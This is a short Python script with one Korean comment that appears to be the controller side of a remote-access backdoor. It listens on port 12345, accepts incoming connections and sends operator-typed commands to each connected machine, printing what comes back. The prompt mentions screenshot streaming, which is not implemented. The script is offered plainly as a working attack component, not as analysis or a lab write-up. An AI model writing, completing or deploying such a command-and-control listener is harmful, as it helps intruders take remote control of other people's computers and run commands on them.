import socket
import threading
import base64
from PIL import Image
import io

def get_host_ip():
    # 로컬 IP 주소 가져오기
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return local_ip

def start_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"[+] Listening on {host}:{port}")

    while True:
        conn, addr = server_socket.accept()
        print(f"[+] Connection from {addr}")

        # Handle client in a new thread
        client_thread = threading.Thread(target=handle_client, args=(conn,))
        client_thread.start()

def handle_client(conn):
    while True:
        command = input("Command to execute (or 'exit' to quit, 'screenshot' to stream): ")
        if command.lower() == 'exit':
            conn.sendall(command.encode())
            conn.close()
            break
        else:
            conn.sendall(command.encode())
            output = conn.recv(4096).decode()
            print(output)


if __name__ == "__main__":
    host_ip = get_host_ip()
    print(f"Server IP: {host_ip}")
    port = 12345
    start_server(host=host_ip, port=port)
